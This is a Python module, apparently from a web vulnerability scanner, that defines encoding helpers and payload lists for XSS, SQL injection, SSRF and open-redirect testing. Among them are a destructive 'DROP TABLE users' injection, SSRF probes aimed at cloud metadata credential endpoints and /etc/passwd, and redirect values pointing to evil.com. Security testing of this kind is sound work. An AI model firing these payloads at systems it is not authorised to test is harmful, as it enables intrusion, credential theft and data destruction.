from __future__ import annotations
from urllib.parse import quote


def html_encode(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def url_encode(s: str) -> str:
    return quote(s, safe="")


def double_url_encode(s: str) -> str:
    return quote(quote(s, safe=""), safe="")


XSS_PAYLOADS = [
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "<ScRiPt>alert(1)</ScRiPt>",
    '"><body onload=alert(1)>',
    "'-alert(1)-'",
]

SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    '"',
    "1'--",
    '1"--',
    "1' OR '1'='1",
    "1 AND 1=1--",
    "1 AND 1=2--",
    "' OR 1=1--",
    "' OR 'x'='x",
    "'; DROP TABLE users--",
]

SQLI_TIME_PAYLOADS = {
    "mysql": ["1; SELECT SLEEP(5)--", "1' AND SLEEP(5)--"],
    "postgres": ["1; SELECT pg_sleep(5)--", "1' AND pg_sleep(5)--"],
    "mssql": ["1; WAITFOR DELAY '0:0:5'--", "1' WAITFOR DELAY '0:0:5'--"],
    "sqlite": ["1 AND 1=(SELECT 1 FROM sqlite_master WHERE 1=randomblob(100000000))"],
}

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://0.0.0.0",
    "http://[::1]",
    "http://2130706433",  # 127.0.0.1 in decimal
    "dict://127.0.0.1:22/",
    "file:///etc/passwd",
    "http://metadata.google.internal/computeMetadata/v1/",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "\\/\\/evil.com",
    "https:evil.com",
    "//evil.com%2F",
    "%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
    "/%2Fevil.com",
]

REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "goto", "dest", "destination",
    "continue", "returnUrl", "return_url", "callback", "redirect_uri",
    "redirectUrl", "to", "target", "link", "ref", "referer", "back",
    "forward", "location", "redirect_to",
]

SSRF_PARAMS = [
    "url", "uri", "href", "link", "src", "source", "host", "target",
    "dest", "destination", "redirect", "proxy", "endpoint", "fetch",
    "data", "path", "callback", "webhook", "ping", "imageUrl", "image",
    "load", "content", "page", "file",
]
